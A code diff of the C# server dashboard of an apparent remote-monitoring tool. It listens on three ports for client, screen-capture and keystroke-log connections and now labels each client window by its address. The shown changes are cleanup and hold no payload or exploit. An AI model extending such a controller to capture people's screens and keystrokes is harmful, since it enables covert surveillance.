@@ -1,16 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net.Sockets;
 using System.Net;
 using System.Threading;
-
 namespace Server
 {
     public partial class DashBoard : Form
@@ -22,10 +14,6 @@ namespace Server
         private TcpListener server;
         private TcpListener screenServer;
         private TcpListener logServer;
-
-        private NetworkStream mainStream;
-        private NetworkStream screenStream;
-        private NetworkStream keylogStream;
         private readonly Thread Listening;
 
         const string KEY = "CHƯƠNG TRÌNH THEO DÕI TỪ XA";
@@ -33,15 +21,12 @@ namespace Server
         {
             CheckForIllegalCrossThreadCalls = false;
             Listening = new Thread(StartListening);
-            //Handle = new Thread(HandleClient);
             Listening.IsBackground = true;
             InitializeComponent();
         }
-
-
         private void StartListening()
         {
-            
+
             try
             {
                 server.Start();
@@ -61,7 +46,6 @@ namespace Server
                     Handle.IsBackground = true;
                     Handle.Start();
                 }
-
             }
             catch
             {
@@ -75,11 +59,8 @@ namespace Server
             logServer.Stop();
             if (Listening.IsAlive)
                 Listening.Abort();
-            //if (GetImage.IsAlive)
-            //    GetImage.Abort();
 
         }
-
         private void DashBoard_Load(object sender, EventArgs e)
         {
             server = new TcpListener(IPAddress.Any, 8080);
@@ -87,16 +68,14 @@ namespace Server
             logServer = new TcpListener(IPAddress.Any, 8082);
             Listening.Start();
         }
-
-
-
         public void HandleClient()
         {
-            Form c = new ControlForm(client, logClient, screenClient);
-            c.Name = "Bo";
+            string clientID = client.Client.RemoteEndPoint.ToString();
+            Form c = new ControlForm(client, logClient, screenClient, clientID);
+            c.Name = clientID;
+            c.Text = clientID;
             c.Show();
             Application.Run();
         }
-
     }
 }
